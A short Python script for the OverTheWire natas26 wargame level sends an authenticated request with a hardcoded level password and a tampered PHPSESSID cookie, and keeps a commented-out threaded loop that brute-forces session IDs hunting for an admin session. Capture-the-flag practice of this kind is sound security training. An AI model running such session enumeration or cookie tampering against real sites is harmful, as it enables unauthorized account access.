import requests
import string
import time
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import chain


def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

# def check_session(i):
URL = "http://natas26.natas.labs.overthewire.org"
auth_username = "natas26"
auth_password = "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE"
headers = {"authorization": 'Basic {0}'.format(base64.b64encode((auth_username + ':' + auth_password).encode('utf8')).decode())}
params = {'x1':'1','y1':'2','x2':'3','y2':'4'}
cookies = {'PHPSESSID': '123>'}

response = requests.get(URL, params=params, headers=headers, cookies=cookies)
print(response.text)
    # if "You are an admin" in response.text:
    #     print(f"Admin session found: PHPSESSID={cookies['PHPSESSID']}")
    #     print(response.text)
    #     return True
    # return False

# def main():
#     with ThreadPoolExecutor(max_workers=10) as executor:
#         futures = []
#         for i in range(1000):
#                 futures.append(executor.submit(check_session, i))
        
#         for future in as_completed(futures):
#             if future.result():
#                 # If an admin session is found, shut down all other threads
#                 executor.shutdown(wait=False)
#                 break

# if __name__ == "__main__":
#     main()
